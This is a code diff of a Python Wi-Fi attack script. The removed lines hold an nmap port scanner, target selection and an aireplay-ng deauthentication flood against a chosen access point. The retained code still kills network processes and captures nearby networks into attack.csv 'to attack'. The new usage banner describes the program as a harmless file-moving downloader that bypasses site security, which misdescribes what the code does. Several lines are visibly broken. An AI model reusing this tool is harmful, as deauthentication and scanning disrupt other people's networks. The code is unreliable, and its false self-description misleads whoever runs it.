@@ -1,5 +1,5 @@
 import subprocess, re, csv, os, time, shutil, sys, getpass, traceback, platform, time, threading, pprint
-import nmap, pathlib
+import pathlib
 from datetime import datetime
 from subprocess import Popen, call, PIPE
 import IPCHECKER as IPx
@@ -120,15 +120,15 @@ def display_header():
     print(f"{'X' * 125: ^70}")
 
     one = (
-        f'[USAGE] - [1] This is a simple dossing program.')
+        f'[USAGE] - [1] This is a python program that takes a specified file names, and moves them into an individual folder.')
     two = (
-        f'[USAGE] - [2] The program requires  Linux or MacoS {red} WE DO NOT TOLERATE WINDOWS {reset} \n[USAGE] - [2]*Dependencies will auto install')
+        f'[USAGE] - [2] The program works well with most download repositories, and currently gets around security measure implimented by \n[USAGE] - [2]b 1337x.to, itorrent && archive.org')
     three = (
-        f'[USAGE] - [3] The program works best with KALI-LINUX/UBUNTU. It will auto-find your NIC.')
-    four = (f'[USAGE] - [4] Remember your NIC ID if {red} not on {reset} KALI-LINUX or UBUNTU')
+        f'[USAGE] - [3] Download a LINK GRABBING extension from chrome, to pull the URLs off of the browsers tabs.')
+    four = (f'[USAGE] - [4] Save the list into download_list.txt (Found in the Directory as this program')
     five = (
-        f'[USAGE] - [5] Program will use ARP, NMAP and Wireshark.')
-    six = (f'{yellow}**copyright material from Adel Al-Aali [SYSTEM]{reset}')
+        f'[USAGE] - [5] Wait for downloads. Archive.org may be slow. The program saves both a LIST and DICT for further usage. (see functions)')
+    six = (f'[SYSTEM] copyright material from Adel Al-Aali [SYSTEM]')
 
     print(f"{one:^70}")
     print(f"{two:^70}")
@@ -137,8 +137,7 @@ def display_header():
     print(f"{five:^70}")
     print(f"{six:^70}")
     print(f"{x * 20: ^70}")
-    print()
-    print()
+    print(), print()
 
 
 def period_wait():
@@ -188,13 +187,6 @@ def install():
             sucessfull_install.append('airmong-ng')
         print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')
 
-        subprocess.check_call([sys.executable, "-m", "apt install", "airmon-ng", python-nmap])
-        if subprocess.check_call:
-            print(f'{yellow} Sucessfully Installed python-nmap')
-            sucessfull_install.append('python-nmap')
-
-        print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')
-
     except subprocess.CalledProcessError as sub0:
         traceback.print_exc()
         print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub0)}')
@@ -204,45 +196,6 @@ def install():
     except subprocess.SubprocessError as sub2:
         traceback.print_exc()
         print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub2)}')
-
-# python-nmap
-    # Step 2: pip install python-nmap
-
-
-def arp_scan():
-    ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
-    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
-    port_min = 0
-    port_max = 65535
-    open_ports = []
-    # Ask user to input the ip address they want to scan.
-    while True:
-        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
-        print(f"**{yellow}**Enter the IP address for scanning  {reset}\n ")
-        port_range = input("* ")
-        if ip_add_pattern.search(ip_add_entered):
-            print(f"{ip_add_entered} is a valid ip address")
-            break
-    while True:
-        print(f"**{yellow}**Enter the port range {reset}\n ")
-        port_range = input("* ")
-        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
-        if port_range_valid:
-            port_min = int(port_range_valid.group(1))
-            port_max = int(port_range_valid.group(2))
-            break
-
-    nm = nmap.PortScanner()
-    for port in range(port_min, port_max + 1):
-        try:
-            result = nm.scan(ip_add_entered, str(port))
-            print(result)
-            port_status = (result['scan'][ip_add_entered]['tcp'][port]['state'])
-            print(f"Port {port} is {port_status}")
-        except:
-            traceback.print_exc()
-            print(f"{red}**ERROR IN NMAP SCAN{port}.")
-
 
 
 ACTIVE_NETWORKS = []
@@ -258,6 +211,7 @@ def check_wifi(ssid, list):
             check_status = False
             return check
         return check
+
 
 try:
     print(IPx.get_ip)
@@ -307,7 +261,6 @@ current_platform = platform.system()
 platform_name = sys.platform
 while True:
     if 'Windows' in current_platform:
-        print('X' * 50)
         print(f'{red} Your OS {current_platform} || {platform_name} sucks. \n**FUCK-WINDOWS-**{reset}')
         period_wait()
         sys.exit(1)
@@ -393,7 +346,6 @@ else:
 
 try:
     with Spinner():
-        arp_scan()
         cwd = os.getcwd()
         for f in os.listdir(cwd):
             if 'attack.csv' in f:
@@ -406,7 +358,6 @@ try:
                 backup = pathlib.PurePath('/backup/')
                 if backup not in os.walk(directory):
                     try:
-                        print('X' * 50)
                         os.mkdir(directory + "/backup/")
                         timestamp = datetime.now()
                         shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
@@ -428,26 +379,45 @@ except IOError as e:
 
 else:
     try:
+        # raise OSError:
+        #     print(f'{red} OS-ERROR, \n{err}')
+        #
         run_discovery = True
         while run_discovery:
             subprocess.call('clear', shell=True)
+
+            signal = True
             for file_name in os.listdir(cwd):
-                if 'attack.csv' in file_name:
-                    print(f'{yellow}**Found attack.csv in{reset}\n {cwd}')
-                else:
-                    print(f'{red}**Did not find a directory, searching for one.. {reset}')
-                    csv_loc = directory + 'attack.csv'
-                    print(f'{yellow}**The .csv was created xwerghmn  '
-                          f' in: {reset} \n*{csv_loc}')
-                    file = open(csv_loc, 'a')
-                    if file:
-                        print(f'{yellow}**Created attack.csv in:{reset} \n {csv_loc}')
-                        time.sleep(1)
-                        break
-    except Exception as e:
+                if signal is False:
+                    pass
+                while signal:
+                    if 'attack.csv' in file_name:
+                        print(f'{yellow}**Found attack.csv in{reset}\n {cwd}')
+                        signal = False
+                        pass
+                    else:
+                        directory = os.getcwd()
+                        print(f'{red}**Did not find a directory, searching for one.. {reset}')
+                        csv_loc = directory + '/attack.csv'
+                        os.mkdir(csv_loc)
+                        print(f'{yellow}**The .csv was created in: {reset} \n*{csv_loc}')
+                        file = open(csv_loc, 'a')
+
+                        if file:
+                            print(f'{yellow}**Created attack.csv in:{reset} \n {csv_loc}')
+                            time.sleep(1)
+                            signal = False
+                            pass
+
+  #  except Exception as e:
+    except:
         traceback.print_exc()
         print(f'{red}**Error, must have input{reset}')
-        print(str(e))
+      #  print(str(e))
+        pass
+
+
+
     else:
         display_header()
         period_wait()
@@ -458,12 +428,11 @@ else:
         print(f'{yellow} {type(nic)} {reset}'), print()
         print('X' * 50)
         print(f'**{yellow}**Wifi adapter now connected, staring processes.{reset}')
-        #### DISPLAY CONFLICTING PROCESSES
-        ### KILL IWCONFIG
-        ## KILL ADDITIONAL PROCESSES
-        # PUT NIC INTO MONITOR
-        # BRING CONTROLER BACK ONLINE #
-        ########### START##################
+
+                ######################################################## ##
+                ######################################################## ##
+                ######################################################## ##
+                ######### START ##############
 
         with Spinner():
             ####### DISPLAY CONFLICTING SUBPROCESSES #########
@@ -475,12 +444,6 @@ else:
             else:
                 print(f'{red} :: No conflicting subprocesses :: {reset}')
 
-            ## KILL IWCONFIG ###
-            kill_iw = subprocess.run(['sudo', 'link', 'set', nic, 'down'])
-            if kill_iw:
-                print(f'{yellow} :: Killing IW :: {reset}')
-                print(kill_iw)
-                time.sleep(3)
 
             ############# KILL PROCESS ###################
             kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
@@ -494,43 +457,22 @@ else:
                 #run_discovery = False
                 # break
 
-            ############ START MONITORING MODE ##############
-            monitored_mode = subprocess.run(["iw",nic , "set", "monitor", "none"])
-            if monitored_mode:
-                print(f'{yellow} :: Killing System Processes ::')
-                print(monitored_mode)
-              #  run_discovery = False
-               # break
+                ########### START##################
+            start = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
+            if start:
+                print(f'**{yellow}**[Succesfully Started Airmon-NG]** {reset}')
+                print(start)
             else:
-                print(f'{red}**Monitor Mode Failed**{reset}')
-
-
-            # Bring the WiFi controller back online.
-            iw_up = subprocess.run(["ip", "link", "set", nic, "up"])
-            if iw_up:
-                print(f'{yellow} :: Turning On The Interface ::')
-                print(iw_up)
-              #  run_discovery = False
-               # break
-            else:
-                print(f'{red}*ERROR IN BRINGING INTERFACE BACK UP**{reset}')
-
-            #
-            # start = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
-            # if start:
-            #     print(f'**{yellow}**[Succesfully Started Airmon-NG]** {reset}')
-            #     print(start)
-            # else:
-            #     print(f'{red}**monitored mode failed{reset}')
+                print(f'{red}**monitored mode failed{reset}')
 
             ######### START SEQUENCE FOR DISCOVER AP #######
-
             discover_ap = subprocess.Popen(
                 ['sudo', 'airodump-ng', '-w', 'attack', '--write-interval', '1', '--output-format', 'csv',
                  nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
             if discover_ap:
                 print(f'**{yellow}**[DISCOVERED AP]** {reset}')
 
+##########################################################################
             for file in os.listdir(cwd):
                 if "attack.csv" not in file:
                     print(f'{red}** Did not find a directory, searching for one.. {reset}')
@@ -541,7 +483,7 @@ else:
                         print(f'{yellow}**Created attack.csv in:{reset} \n {csv_loc}')
                         time.sleep(1)
                         break
-                     elif 'attack.csv' in file:
+                    elif 'attack.csv' in file:
                         print(f'{yellow}**.CSV already exists, moving on.. {reset}')
 
             with 'attack.csv' in os.listdir(cwd) as csv_h:
@@ -568,13 +510,12 @@ else:
                         elif check_wifi(row['LAN_IP'], ACTIVE_NETWORKS):
                             print(f'{yellow} found LAN_IP in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                             ACTIVE_NETWORKS.append(row)
-                    print()
-                    print('X' * 50)
+
                     print(
                         f'**{yellow}Scanning. Press control+ when you want to select the network you want to attack.{reset}\n')
                     print("No |\tBSSID              |\tChannel|\tESSID                         |")
                     print("___|\t___________________|\t_______|\t______________________________|")
-                    print(f'{yellow}**[ACTIVE_NETWORKS]{reset}\n{red}{ACTIVE_NETWORKS}{reset}')
+                    print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
 
                     try:
                         for index, item in enumerate(ACTIVE_NETWORKS):
@@ -582,8 +523,6 @@ else:
                             active_network = True
                             while active_network:
                                 if KeyboardInterrupt:
-                                    print()
-                                    print('X' * 50)
                                     print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
                                     traceback.print_exc()
                                     active_network = False
@@ -606,7 +545,6 @@ else:
                         print(f'{red}**{str(error)}{reset}')
 
                     except KeyboardInterrupt:  ### keyboard interupt --> disable monitormode
-                        print('X' * 50)
                         print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
                         traceback.print_exc()
                         pprint.pprint(ACTIVE_NETWORKS)
@@ -616,65 +554,10 @@ else:
                         if disable_monitor:
                             print(f'{red}**Successfully Killed Monitoring Process{reset}')
                             print(f'{red}*Breaking Loop{reset}')
-                            #print(f'{red}*Choose your target{red}')
                             run_discovery = False
-                            print('X' * 50)
 
-
-try:
-    print('X'*50)
-    arp_scan()
-    pprint.pprint(ACTIVE_NETWORKS)
-    print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
-    print('X'*50)
-    while True:
-        print(f'{yellow}**[Choose Your Target]\n{ACTIVE_NETWORKS}')
-        victim = input('*')
-        if victim:
-            break
-    target_ssid = ACTIVE_NETWORKS[int(victim)]['BSSID']
-    target_channel = ACTIVE_NETWORKS[int(victim)]['channel'].strip()
-    print('X'*50)
-    pprint.pprint(ACTIVE_NETWORKS)
-    print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
-    pprint.pprint(target_ssid)
-    print(f'{yellow}**[TARGET_SSID]\n{target_ssid}')
-    pprint.pprint(target_ssid)
-    print(f'{yellow}**[TARGET_CHANNEL]\n{target_channel}')
-    print('X'*50)
-except EOFError as EOF:
-    print('X'*50)
-    traceback.print_exc()
-    print(str(EOF))
-    print(f'{red}**Error, must have input{reset}')
-except Exception as e:
-    print('X'*50)
-    traceback.print_exc()
-    print(str(e))
-
-## start attack using channel
-try:
-    print('X' * 50)
-    subprocess.run(['airmon-ng', 'start', nic , target_channel])
-    subprocess.run(['aireplay-ng', '--deauth', '0', '-a', target_ssid, target_channel])
-
-except KeyboardInterrupt:  ### keyboard interupt --> disable monitormode
-    print('X' * 50)
-    print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
-    traceback.print_exc()
-    pprint.pprint(ACTIVE_NETWORKS)
-    ## DISABLE MONITORED MODE
-    print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
-    disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
-    if disable_monitor:
-        print(f'{red}**Successfully Killed Monitoring Process{reset}')
-        print(f'{red}*Breaking Loop{reset}')
-        # print(f'{red}*Choose your target{red}')
-        run_discovery = False
-        print('X' * 50)
-
-except Exception as final_error:
-        traceback.print_exc()
-        print(f'{red}**{str(final_error)}**{reset}')
-
+#         except Exception as final_error:
+#             traceback.print_exc()
+#             print(f'{red}**{str(final_error)}.{reset}')
 #
+# #
